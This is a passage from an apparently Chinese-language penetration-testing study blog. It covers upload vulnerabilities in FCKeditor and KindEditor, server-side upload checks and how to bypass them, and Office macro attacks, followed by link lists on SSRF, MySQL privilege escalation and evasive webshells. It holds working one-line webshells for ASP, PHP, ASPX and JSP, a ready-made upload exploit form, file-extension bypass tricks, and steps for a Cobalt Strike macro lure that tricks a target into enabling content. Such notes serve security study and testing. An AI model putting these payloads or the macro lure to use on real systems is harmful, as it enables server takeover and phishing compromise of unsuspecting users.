class="hljs-regexp">/browser.html?Type=Image&amp;Connector=http:/</span><span class="hljs-regexp">/www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php (ver:2.6.3 测试通过)</span></code></pre><pre><code class="hljs gradle">JSP 版：FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/browser.html?Type=Image&amp;Connector=connectors/</span>jsp/connector.jsp注意红色部分修改为FCKeditor 实际使用的脚本语言，蓝色部分可以自定义文件夹名称也可以利用../..目录遍历，紫色部分为实际网站地址。</code></pre><pre><code class="hljs gradle">FCKeditor 中test 文件的上传地址FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>test.htmlFCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/upload/</span>test.htmlFCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>test.htmlFCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/u</span>ploadtest.html</code></pre><pre><code class="hljs awk">一般很多站点都已删除_samples 目录，可以试试。FCKeditor<span class="hljs-regexp">/editor/</span>fckeditor.html 不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页。</code></pre><p>参考文章：</p><ul><li><a href="https://cloud.tencent.com/developer/news/210677">https://cloud.tencent.com/developer/news/210677</a></li></ul><p><strong>上传的思路</strong></p><p><strong>Version 2.2 版本</strong></p><p>Apache+linux 环境下在上传文件后面加个.突破！测试通过</p><p><strong>Version &lt;=2.4.2 For php</strong></p><p>在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址</p><pre><code class="hljs stata">&lt;<span class="hljs-keyword">form</span> id=<span class="hljs-string">&quot;frmUpload&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>action=<span class="hljs-string">&quot;http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;Upload a new <span class="hljs-keyword">file</span>:&lt;<span class="hljs-keyword">br</span>&gt;&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;NewFile&quot;</span> size=<span class="hljs-string">&quot;50&quot;</span>&gt;&lt;<span class="hljs-keyword">br</span>&gt;&lt;<span class="hljs-keyword">input</span> id=<span class="hljs-string">&quot;btnUpload&quot;</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Upload&quot;</span>&gt;&lt;/<span class="hljs-keyword">form</span>&gt;</code></pre><p><strong>FCKeditor 文件上传.变_下划线的绕过方法</strong></p><p>很多时候上传的文件例如：shell.php.rar 或shell.php;.jpg 会变为shell_php;.jpg 这是新版FCK 的变化</p><p>提交shell.php+空格绕过，不过空格只支持win 系统 *nix 是不支持的[shell.php 和shell.php+空格是2 个不同的文件 未测试</p><p>继续上传同名文件可变为shell.php;(1).jpg 也可以新建一个文件夹，只检测了第一级的目录，如果跳到二级目录就不受限制</p><p><strong>Version 2.4.1 测试通过</strong></p><p>修改CurrentFolder 参数使用 …/…/ 来进入不同的目录</p><pre><code class="hljs gradle"><span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>aspx<span class="hljs-regexp">/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../</span>../..%<span class="hljs-number">2</span>F&amp;NewFolderName=shell.asp</code></pre><p><strong>根据返回的XML 信息可以查看网站所有的目录</strong></p><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%<span class="hljs-number">2</span>F</code></pre><p><strong>也可以直接浏览盘符</strong>：<br><strong>JSP 版本</strong>：</p><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%<span class="hljs-number">2</span>F</code></pre><p><strong>Fckeditor 2.0 &lt;= 2.2</strong></p><p>允许上传asa、cer、php2、php4、inc、pwml、pht 后缀的文件上传后它保存的文件直接用的<code>$sFilePath = $sServerDir . $sFileName</code>，而没有使用<code>$sExtension</code>为后缀.直接导致在windows下在上传文件后面加个.来突破（这里点点很重要）</p><p>而在apache 下，因为”Apache 文件名解析缺陷漏洞”也可以利用之，另建议其他上传漏洞中定义TYPE 变量时使用File 类别来上传文件,根据FCKeditor 的代码，其限制最为狭隘</p><p>在上传时遇见可直接上传脚本文件固然很好，但有些版本可能无法直接上传可以利用在文件名后面加.点或空格绕过，也可以利用iis6 解析漏洞建立xxx.asp文件夹或者上传<code>xx.asp;.jpg</code></p><p>参考文章：</p><ul><li><a href="https://www.cnblogs.com/zpchcbd/p/11745119.html">https://www.cnblogs.com/zpchcbd/p/11745119.html</a></li></ul><hr><h5 id="KindEditor"><a href="#KindEditor" class="headerlink" title="KindEditor"></a>KindEditor</h5><p><strong>上传页面</strong></p><pre><code class="hljs gradle">kindeditor<span class="hljs-regexp">/asp/u</span>pload_json.asp?dir=<span class="hljs-keyword">file</span>kindeditor<span class="hljs-regexp">/asp.net/u</span>pload_json.ashx?dir=<span class="hljs-keyword">file</span>kindeditor<span class="hljs-regexp">/jsp/u</span>pload_json.jsp?dir=<span class="hljs-keyword">file</span>kindeditor<span class="hljs-regexp">/php/u</span>pload_json.php?dir=<span class="hljs-keyword">file</span></code></pre><p><strong>上传思路</strong><br>kindeditor&lt;=4.1.5</p><pre><code class="hljs awk">curl -F<span class="hljs-string">&quot;imgFile=@1.html&quot;</span>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/test/</span>kindeditor<span class="hljs-regexp">/php/u</span>pload_json.php?dir=file</code></pre><p>参考文章：</p><ul><li><a href="https://www.sinesafe.com/article/20190510/Kindeditor.html">https://www.sinesafe.com/article/20190510/Kindeditor.html</a></li><li><a href="https://www.freebuf.com/column/202148.html">https://www.freebuf.com/column/202148.html</a>   –上传思路</li></ul><hr><h4 id="上传漏洞总结"><a href="#上传漏洞总结" class="headerlink" title="上传漏洞总结"></a>上传漏洞总结</h4><h5 id="概要说明"><a href="#概要说明" class="headerlink" title="概要说明"></a>概要说明</h5><p>文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接</p><p><strong>Asp一句话</strong> ：</p><pre><code class="hljs asp">&lt;%eval request(“kkk”)%&gt; kkk</code></pre><p><strong>Php一句话：</strong></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">666</span>]);<span class="hljs-meta">?&gt;</span> <span class="hljs-number">666</span></code></pre><p><strong>Aspx一句话:</strong></p><pre><code class="hljs aspx">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;111&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p><strong>Jsp一句话：</strong></p><pre><code class="hljs jsp">&lt;%<span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;f&quot;</span>)!=<span class="hljs-keyword">null</span>)(<span class="hljs-keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="hljs-string">&quot;\\&quot;</span>)+request.getParameter(<span class="hljs-string">&quot;f&quot;</span>))).write(request.getParameter(<span class="hljs-string">&quot;t&quot;</span>).getBytes());%&gt;</code></pre><p>参考一句话：</p><ul><li><a href="https://my.oschina.net/u/4373914/blog/3467075">https://my.oschina.net/u/4373914/blog/3467075</a></li></ul><hr><h5 id="服务端的上传验证"><a href="#服务端的上传验证" class="headerlink" title="服务端的上传验证"></a>服务端的上传验证</h5><p><strong>1）白名单验证定义允许上传的后缀类型,除此所有后缀都不允许</strong></p><p><strong>2）黑名单验证</strong></p><p>定义不允许上传的后缀类型，除此之类其他后缀都可以上传</p><p>定义不允许上传的后缀：</p><pre><code class="hljs plain">asp、aspx、asa、cer、cdx、ash</code></pre><p>【突破方法】</p><ol><li><p>未重命名可以配合解析漏洞(很少)</p></li><li><p>可以用cer达到绕过效果</p></li><li><p>如果未用转换函数强制转换后缀为小写(ASP)</p></li><li><p>特殊后缀达到效果可利用ashx来生成一句话</p></li><li><p>.htaccess来实现后缀引导。上传jpg可以解析成脚本，具体在内容定义</p></li></ol><p><strong>3）文件头验证</strong><br>文件内容开头加上<code>GIF89a</code><br><strong>4）文件类型验证</strong><br>例如可以把php的文件类型改成正常的图片类型</p><p><strong>5）文件后缀验证</strong></p><p>典型的白名单验证，指定上传后缀必须为jpg、JPG、jpeg、JPEG</p><p><strong>6）js前端验证</strong></p><p>Js在前端定义了允许上传的后缀类型</p><p>【突破方法】直接在前端修改或添加后缀，找不到就搜索图片后缀如jpg。或者直接抓包改。</p><p>……</p><p>等等，后续分开写</p><hr><h3 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h3><p>太多了，后续分开写。</p><hr><h3 id="文件读取漏洞"><a href="#文件读取漏洞" class="headerlink" title="文件读取漏洞"></a>文件读取漏洞</h3><ul><li><a href="https://xz.aliyun.com/t/6594">https://xz.aliyun.com/t/6594</a></li></ul><h3 id="Pentesterlab-Xss"><a href="#Pentesterlab-Xss" class="headerlink" title="Pentesterlab Xss"></a>Pentesterlab Xss</h3><p>Pentesterlab是一个靶机环境</p><p><a href="https://pentesterlab.com/">https://pentesterlab.com/</a>  –官网<br><a href="https://download.vulnhub.com/pentesterlab/web_for_pentester_i386.iso">https://download.vulnhub.com/pentesterlab/web_for_pentester_i386.iso</a>  –安装包</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/he_and/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">79798958</span>https:<span class="hljs-regexp">//</span>www.andseclab.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">11</span><span class="hljs-regexp">/11/</span>pentesterlab-xss题解/http:<span class="hljs-regexp">//</span>secpark.com.cn<span class="hljs-regexp">/articles/</span><span class="hljs-number">2018</span><span class="hljs-regexp">/05/</span><span class="hljs-number">28</span>/<span class="hljs-number">1527502530234</span>.html   --很直观</code></pre><p>三篇文章详细讲解了pentesterlab靶机进行XSS渗透！！！</p><hr><h3 id="Office宏的基本利用"><a href="#Office宏的基本利用" class="headerlink" title="Office宏的基本利用"></a>Office宏的基本利用</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。而宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上</p><p>Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本</p><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a><strong>环境准备</strong></h4><pre><code class="hljs apache"><span class="hljs-attribute">Windows</span> <span class="hljs-number">7</span> x<span class="hljs-number">64</span> 旗舰版<span class="hljs-attribute">Microsoft</span> Office <span class="hljs-number">2016</span><span class="hljs-attribute">CobaltStrike</span> <span class="hljs-number">4</span></code></pre><h4 id="CobaltStrike生成宏"><a href="#CobaltStrike生成宏" class="headerlink" title="CobaltStrike生成宏"></a><strong>CobaltStrike生成宏</strong></h4><p>先利用CobaltStrike生成宏payload，接下来只要放入word、excel或ppt即可<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/10.png" alt="生成宏"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/11.png" alt="生成宏"></p><h4 id="创建宏Word"><a href="#创建宏Word" class="headerlink" title="创建宏Word"></a><strong>创建宏Word</strong></h4><p>打开Word文档，点击 “Word 选项 — 自定义功能区 — 开发者工具(勾选) — 确定”<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/12.png" alt="创建宏Word"><br>编写主体内容后，点击 “开发工具 — Visual Basic” 。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/13.png" alt="创建宏Word"><br>双击 “ThisDocument” ，将原有内容全部清空，然后将CobaltStrike生成宏payload全部粘贴进去，保存并关闭该 VBA 编辑器<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/14.png" alt="创建宏Word"><br>另存为的Word类型务必要选”Word 97-2003 文档 (*.doc)”，即 doc 文件，保证低版本可以打开。之后关闭，再打开即可执行宏代码<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/15.png" alt="创建宏Word"><br><strong>反弹Beacon shell</strong><br>默认情况下，Office已经禁用所有宏，但仍会在打开Word文档的时候发出通知</p><p>诱导目标手动点击”启用内容”宏。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/16.png" alt="反弹Beacon shell"><br>目标一旦启用，CobaltStrike的Beacon就会上线，即成功接收到Shell<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/17.png" alt="反弹Beacon shell"></p><p>参考文章：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/98526727">https://zhuanlan.zhihu.com/p/98526727</a>    –感谢我不是大神的文章</li></ul><hr><h3 id="Discuz-Ssrf-Rce漏洞分析报告"><a href="#Discuz-Ssrf-Rce漏洞分析报告" class="headerlink" title="Discuz Ssrf Rce漏洞分析报告"></a>Discuz Ssrf Rce漏洞分析报告</h3><p>很老的一个漏洞了</p><ul><li><p><a href="https://cloud.tencent.com/developer/article/1511949">https://cloud.tencent.com/developer/article/1511949</a>     —复现</p></li><li><p><a href="https://xz.aliyun.com/t/2018">https://xz.aliyun.com/t/2018</a>            —Discuz!因Memcached未授权访问导致的RCE</p></li><li><p><a href="https://cn-sec.com/archives/76754.html">https://cn-sec.com/archives/76754.html</a>       —<a href="https://cn-sec.com/archives/76754.html">https://cn-sec.com/archives/76754.html</a></p></li><li><p><a href="https://www.freebuf.com/vuls/191698.html">https://www.freebuf.com/vuls/191698.html</a>        —Discuz x3.4前台SSRF漏洞分析</p></li></ul><ul><li><a href="https://hackmd.io/@Lhaihai/H1B8PJ9hX">https://hackmd.io/@Lhaihai/H1B8PJ9hX</a>    –SSRF集合笔记</li></ul><hr><h3 id="WordPress语言文件代码执行漏洞分析"><a href="#WordPress语言文件代码执行漏洞分析" class="headerlink" title="WordPress语言文件代码执行漏洞分析"></a>WordPress语言文件代码执行漏洞分析</h3><p>参考：</p><ul><li><p><a href="https://www.seebug.org/vuldb/ssvid-92459">https://www.seebug.org/vuldb/ssvid-92459</a></p></li><li><p><a href="https://gist.github.com/anonymous/908a087b95035d9fc9ca46cef4984e97">https://gist.github.com/anonymous/908a087b95035d9fc9ca46cef4984e97</a></p></li><li><p><a href="http://php.net/manual/zh/function.create-function.php">http://php.net/manual/zh/function.create-function.php</a></p></li><li><p><a href="https://www.exploit-db.com/exploits/32416/">https://www.exploit-db.com/exploits/32416/</a></p></li><li><p><a href="https://bugs.php.net/bug.php?id=48231">https://bugs.php.net/bug.php?id=48231</a></p></li><li><p><a href="http://www.2cto.com/Article/201212/177146.html">http://www.2cto.com/Article/201212/177146.html</a></p></li><li><p><a href="https://codex.wordpress.org/InstallingWordPressinYourLanguage">https://codex.wordpress.org/InstallingWordPressinYourLanguage</a></p></li></ul><ul><li><a href="https://cloud.tencent.com/developer/article/1078451">https://cloud.tencent.com/developer/article/1078451</a>   –正文，感谢</li></ul><hr><h3 id="Struts2远程命令执行s2-048漏洞分析报告"><a href="#Struts2远程命令执行s2-048漏洞分析报告" class="headerlink" title="Struts2远程命令执行s2-048漏洞分析报告"></a>Struts2远程命令执行s2-048漏洞分析报告</h3><ul><li><a href="https://www.ichunqiu.com/course/58753">https://www.ichunqiu.com/course/58753</a>   –春秋视频讲解</li></ul><ul><li><a href="http://blog.topsec.com.cn/strutss2-048%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://blog.topsec.com.cn/strutss2-048远程命令执行漏洞分析/</a>  –阿尔法实验室</li></ul><ul><li><p><a href="https://www.freebuf.com/vuls/140410.html">https://www.freebuf.com/vuls/140410.html</a>   –复现</p></li><li><p><a href="https://www.jianshu.com/p/05efdc8f4301">https://www.jianshu.com/p/05efdc8f4301</a>  –复现</p></li><li><p><a href="https://www.jianshu.com/p/356291fb26a2">https://www.jianshu.com/p/356291fb26a2</a>  –复现</p></li></ul><ul><li><a href="https://www.zybuluo.com/Dukebf/note/821989">https://www.zybuluo.com/Dukebf/note/821989</a>   –strut2各版本漏洞信息整理</li></ul><p>很老的一个漏洞了…学习下思路~~</p><hr><h3 id="静态免杀php一句话（已过D盾，河马，安全狗）"><a href="#静态免杀php一句话（已过D盾，河马，安全狗）" class="headerlink" title="静态免杀php一句话（已过D盾，河马，安全狗）"></a>静态免杀php一句话（已过D盾，河马，安全狗）</h3><ul><li><a href="https://www.cnblogs.com/ABKing/p/13515014.html">https://www.cnblogs.com/ABKing/p/13515014.html</a>  –2020年8月最新一句话木马免杀（截止2020年8月16日通杀D盾、安全狗，微步，webshellKiller）</li></ul><ul><li><a href="https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug">https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug</a>  –2020年8月如何优雅的隐藏你的webshell</li></ul><p>还有很多方法，这里书籍上的方法未找到，可看书！！</p><hr><h3 id="金融信息系统安全测评方法（不公布！）"><a href="#金融信息系统安全测评方法（不公布！）" class="headerlink" title="金融信息系统安全测评方法（不公布！）"></a>金融信息系统安全测评方法（不公布！）</h3><ul><li><a href="http://www.djbh.net/webdev/file/webFiles/File/jsbz/201232310276.pdf">http://www.djbh.net/webdev/file/webFiles/File/jsbz/201232310276.pdf</a>   —信息安全技术信息安全风险评估规范</li></ul><ul><li><a href="http://www.djbh.net/webdev/file/webFiles/File/zcbz/201226173039.pdf">http://www.djbh.net/webdev/file/webFiles/File/zcbz/201226173039.pdf</a>   —信息安全技术信息系统安全管理要求</li></ul><p>学习下就好！！！</p><p>随着大数据、云计算、人工智能及区块链等新兴技术的应用,银行业手机银行、微信银行等新兴数字化金通过安全测评过程，全面分析出信息系统可能存在的人为破坏场景及其成因与后果，通过科学有效的测试</p><p>所以才提起金融信息系统安全测评方法这块内容的警惕，这里只能看书，网上应该是封了大部分资料书内容很全！！</p><hr><h3 id="Apache-Poi-XXE-Analysis"><a href="#Apache-Poi-XXE-Analysis" class="headerlink" title="Apache-Poi-XXE-Analysis"></a>Apache-Poi-XXE-Analysis</h3><ul><li><a href="https://b1ue.cn/archives/241.html">Apache POI &lt;= 4.1.0 XXE 漏洞 (CVE-2019-12415)</a></li></ul><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/6996">https://xz.aliyun.com/t/6996</a>   —本文复现文章</li></ul><hr><h3 id="记一次阿里主站xss测试及绕过waf防护"><a href="#记一次阿里主站xss测试及绕过waf防护" class="headerlink" title="记一次阿里主站xss测试及绕过waf防护"></a>记一次阿里主站xss测试及绕过waf防护</h3><p>使用工具：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/chaitin/</span>xray</code></pre><ul><li><a href="https://www.loongten.com/2019/12/20/find-alibaba-xss/">https://www.loongten.com/2019/12/20/find-alibaba-xss/</a>   –一枚阿里巴巴主站XSS挖掘之旅</li></ul><p>书里也有另外的思路，大部分都是各种倒腾方法测试，前面也列举了很多，未授权的别乱搞！！</p><h3 id="ClassLoader类加载机制"><a href="#ClassLoader类加载机制" class="headerlink" title="ClassLoader类加载机制"></a>ClassLoader类加载机制</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>javasec.org<span class="hljs-regexp">/javase/</span>ClassLoader/</code></pre><p>该网站是JAVA非常好的一个学习页面，前面也推荐过了，这里提到ClassLoader再次推下！！</p><hr><h3 id="浅谈SSRF原理及其利用"><a href="#浅谈SSRF原理及其利用" class="headerlink" title="浅谈SSRF原理及其利用"></a>浅谈SSRF原理及其利用</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>teamssix.com<span class="hljs-regexp">/year/</span><span class="hljs-number">191222</span>-<span class="hljs-number">192227</span>.html</code></pre><hr><pre><code class="hljs awk">参考文章https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2115</span>http:<span class="hljs-regexp">//</span>www.liuwx.cn/penetrationtest-<span class="hljs-number">3</span>.htmlhttps:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/yuzly/</span>p/<span class="hljs-number">10903398</span>.htmlhttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/vulhub/</span>vulhub<span class="hljs-regexp">/tree/m</span>aster<span class="hljs-regexp">/weblogic/</span>ssrfhttps:<span class="hljs-regexp">//</span>www.netsparker.com<span class="hljs-regexp">/blog/</span>web-security<span class="hljs-regexp">/server-side-request-forgery-vulnerability-ssrf/</span></code></pre><hr><h3 id="Spring-Data-Commons-CVE-2018-1273"><a href="#Spring-Data-Commons-CVE-2018-1273" class="headerlink" title="Spring-Data-Commons (CVE-2018-1273)"></a>Spring-Data-Commons (CVE-2018-1273)</h3><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://blog.nsfocus.net/cve-<span class="hljs-number">2018</span>-<span class="hljs-number">1273</span>-analysis/自行搭建复现<span class="hljs-attribute">https</span>://pianshen.com/article/<span class="hljs-number">9248784281</span>/     vulhub靶机复现<span class="hljs-attribute">http</span>://xxlegend.com/<span class="hljs-number">2018</span>/<span class="hljs-number">04</span>/<span class="hljs-number">12</span>/CVE-<span class="hljs-number">2018</span>-<span class="hljs-number">1273</span>-%<span class="hljs-number">20</span>RCE%<span class="hljs-number">20</span>with%<span class="hljs-number">20</span>Spring%<span class="hljs-number">20</span>Data%<span class="hljs-number">20</span>Commons%<span class="hljs-number">20</span>%E<span class="hljs-number">5</span>%<span class="hljs-number">88</span>%<span class="hljs-number">86</span>%E<span class="hljs-number">6</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">90</span>%E<span class="hljs-number">6</span>%<span class="hljs-number">8</span>A%A<span class="hljs-number">5</span>%E<span class="hljs-number">5</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>A/</code></pre><p>听老的漏洞了，可以玩玩</p><hr><h3 id="xss绕过代码后端长度限制的方法"><a href="#xss绕过代码后端长度限制的方法" class="headerlink" title="xss绕过代码后端长度限制的方法"></a>xss绕过代码后端长度限制的方法</h3><p>参考链接:</p><ul><li><a href="https://www.shangyexinzhi.com/article/387056.html">https://www.shangyexinzhi.com/article/387056.html</a>   –该文章</li><li><a href="https://www.freebuf.com/column/221882.html">https://www.freebuf.com/column/221882.html</a>   –加深</li></ul><hr><h3 id="mysql提权之mof"><a href="#mysql提权之mof" class="headerlink" title="mysql提权之mof"></a>mysql提权之mof</h3><ul><li><p><a href="https://www.jianshu.com/p/6dbac868e2ab">https://www.jianshu.com/p/6dbac868e2ab</a></p></li><li><p><a href="https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/">https://pino-hd.github.io/2018/06/10/MySQL提权之MOF/</a></p></li><li><p><a href="https://www.cnblogs.com/h4ck0ne/p/5154629.html">https://www.cnblogs.com/h4ck0ne/p/5154629.html</a></p></li></ul><hr><h3 id="mysql提权之udf"><a href="#mysql提权之udf" class="headerlink" title="mysql提权之udf"></a>mysql提权之udf</h3><ul><li><a href="http://www.oniont.cn/index.php/archives/310.html">http://www.oniont.cn/index.php/archives/310.html</a></li><li><a href="https://www.jianshu.com/p/5b34c1b6dee7">https://www.jianshu.com/p/5b34c1b6dee7</a></li></ul><hr><h3 id="XSS-基础学习"><a href="#XSS-基础学习" class="headerlink" title="XSS 基础学习"></a>XSS 基础学习</h3><pre><code class="hljs xquery">https://baike.baidu.com/<span class="hljs-type">item</span>/XSS<span class="hljs-meta">%E6</span><span class="hljs-meta">%94</span><span class="hljs-meta">%BB</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%87</span><span class="hljs-meta">%BB</span>   百度百科</code></pre><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">24</span>a19c6434ae   --最新累积</code></pre><p>还有书中知识！！！</p><hr><h3 id="java-反射与内存shell-初探-基于jetty容器的shell-维权"><a href="#java-反射与内存shell-初探-基于jetty容器的shell-维权" class="headerlink" title="java 反射与内存shell 初探-基于jetty容器的shell 维权"></a>java 反射与内存shell 初探-基于jetty容器的shell 维权</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>web/<span class="hljs-number">172753</span>.html    ---利用“进程注入”实现无文件复活 WebShellhttp:<span class="hljs-regexp">//</span>qiushao.net<span class="hljs-regexp">/2020/</span><span class="hljs-number">02</span><span class="hljs-regexp">/15/</span>Java<span class="hljs-regexp">/Java-反射机制介绍/</span>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/jingmoxukong/</span>p/<span class="hljs-number">12049112</span>.html   ---深入理解 Java 反射和动态代理 http:<span class="hljs-regexp">//</span>rui0.cn<span class="hljs-regexp">/archives/</span><span class="hljs-number">1408</span><span class="hljs-comment">#more-1408    --前面了解了一些基础和知识，这是内存shell深入的理解，感谢大佬</span></code></pre><p>书籍上还有不同的思路…</p><hr><h3 id="利用-DNSLOG回显"><a href="#利用-DNSLOG回显" class="headerlink" title="利用 DNSLOG回显"></a>利用 DNSLOG回显</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">98096</span>   --实战https:<span class="hljs-regexp">//</span>codingnote.cc<span class="hljs-regexp">/p/</span><span class="hljs-number">113368</span>   --基础原理</code></pre><p>书籍上还有不同的思路…</p><hr><h3 id="文件合成-图片马生成"><a href="#文件合成-图片马生成" class="headerlink" title="文件合成/图片马生成"></a>文件合成/图片马生成</h3><p>指的是代码写入后不破坏图片为前提,图片仍可正常打开</p><ul><li><a href="https://bbs.zkaq.cn/?t/159.html">https://bbs.zkaq.cn/?t/159.html</a></li><li><a href="https://blog.csdn.net/ltysg0645/article/details/53996658">https://blog.csdn.net/ltysg0645/article/details/53996658</a></li></ul><hr><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" 